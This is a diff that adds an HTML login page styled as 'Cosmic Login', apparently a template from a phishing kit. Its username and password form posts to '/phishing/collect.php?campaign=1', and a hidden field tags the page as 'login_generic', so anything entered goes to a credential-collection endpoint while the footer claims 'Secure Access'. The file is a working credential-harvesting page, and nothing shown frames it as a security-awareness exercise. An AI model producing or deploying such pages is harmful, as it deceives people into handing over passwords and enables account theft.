@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cosmic Login</title>
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <style>
+        /* Same as index but single form */
+        :root {
+            --cosmic-bg: #0a0a0f;
+            --cosmic-glass: rgba(10, 20, 40, 0.6);
+            --cosmic-neon-blue: #00f3ff;
+            --cosmic-neon-green: #00ff9d;
+            --cosmic-neon-purple: #b300ff;
+            --cosmic-neon-pink: #ff00c8;
+            --cosmic-neon-cyan: #0ff0fc;
+            --cosmic-glow: 0 0 20px rgba(0, 243, 255, 0.5);
+            --cosmic-border: 1px solid rgba(0, 243, 255, 0.3);
+        }
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            background: radial-gradient(ellipse at bottom, #0a0a1a 0%, #030307 100%);
+            font-family: 'Share Tech Mono', monospace;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        body::before { content:''; position:fixed; top:0; left:0; width:100%; height:100%; background:url('data:image/svg+xml;utf8,<svg width="100%" height="100%" xmlns="http://www.w3.org/2000/svg"><defs><radialGradient id="g" cx="50%" cy="50%" r="50%"><stop offset="0%" stop-color="%2300f3ff" stop-opacity="0.1"/><stop offset="100%" stop-color="%2300f3ff" stop-opacity="0"/></radialGradient></defs><rect width="100%" height="100%" fill="black"/><circle cx="20%" cy="30%" r="150" fill="url(%23g)"/><circle cx="80%" cy="70%" r="200" fill="url(%23g)"/></svg>'); opacity:0.4; pointer-events:none; z-index:0; }
+        .container { width:100%; max-width:400px; margin:20px; position:relative; z-index:1; }
+        .glass-panel { background:var(--cosmic-glass); backdrop-filter:blur(12px); border:var(--cosmic-border); border-radius:24px; padding:40px 30px; box-shadow:0 20px 40px rgba(0,0,0,0.6), var(--cosmic-glow); }
+        h1 { color:var(--cosmic-neon-blue); text-align:center; margin-bottom:30px; letter-spacing:4px; border-bottom:2px solid var(--cosmic-neon-purple); padding-bottom:15px; }
+        .form-group { margin-bottom:20px; }
+        label { display:block; color:var(--cosmic-neon-cyan); margin-bottom:5px; }
+        input { width:100%; padding:12px 16px; background:rgba(0,0,0,0.5); border:1px solid var(--cosmic-neon-blue); border-radius:30px; color:#fff; font-family:inherit; }
+        input:focus { outline:none; border-color:var(--cosmic-neon-green); box-shadow:0 0 15px var(--cosmic-neon-green); }
+        .btn { width:100%; padding:14px; background:transparent; color:var(--cosmic-neon-blue); border:2px solid var(--cosmic-neon-blue); border-radius:40px; font-size:1.2em; cursor:pointer; margin-top:10px; }
+        .btn:hover { background:var(--cosmic-neon-blue); color:#000; box-shadow:0 0 30px var(--cosmic-neon-blue); }
+        .footer { text-align:center; margin-top:30px; color:#888; font-size:0.8em; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="glass-panel">
+            <h1>🌀 SIGN IN</h1>
+            <form action="/phishing/collect.php?campaign=1" method="post">
+                <input type="hidden" name="page" value="login_generic">
+                <div class="form-group">
+                    <label>Username / Email</label>
+                    <input type="text" name="username" required>
+                </div>
+                <div class="form-group">
+                    <label>Password</label>
+                    <input type="password" name="password" required>
+                </div>
+                <button type="submit" class="btn">LOGIN</button>
+            </form>
+            <div class="footer">⚡ Secure Access</div>
+        </div>
+    </div>
+</body>
+</html>
